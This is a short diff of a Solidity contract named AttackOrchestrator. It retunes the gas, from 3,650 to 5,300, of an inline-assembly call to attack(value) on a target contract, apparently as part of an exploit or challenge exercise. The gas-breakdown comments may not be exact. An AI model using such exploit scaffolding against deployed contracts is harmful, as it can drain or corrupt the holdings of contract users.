@@ -67,10 +67,10 @@ contract AttackOrchestrator {
                 mstore(callDataPtr, 0x64dd891a00000000000000000000000000000000000000000000000000000000)
                 mstore(add(callDataPtr, 0x04), value)           // Value parameter
 
-                // Call attack(value) with 3,650 gas (optimal for SSTORE to deep slot)
-                // Breakdown: 2,900 gas for cold SSTORE + 342 gas for function overhead + 400 gas safety margin
+                // Call attack(value) with 5,300 gas (minimum for SSTORE to deep slot)
+                // Breakdown: 201 gas dispatch + 5000 gas SSTORE (2100 cold + 2900 write) + 99 gas margin
                 let success := call(
-                    3650,       // gas
+                    5300,       // gas
                     target,     // to
                     0,          // value (0 ETH)
                     callDataPtr,// argsOffset (where we stored the call data)
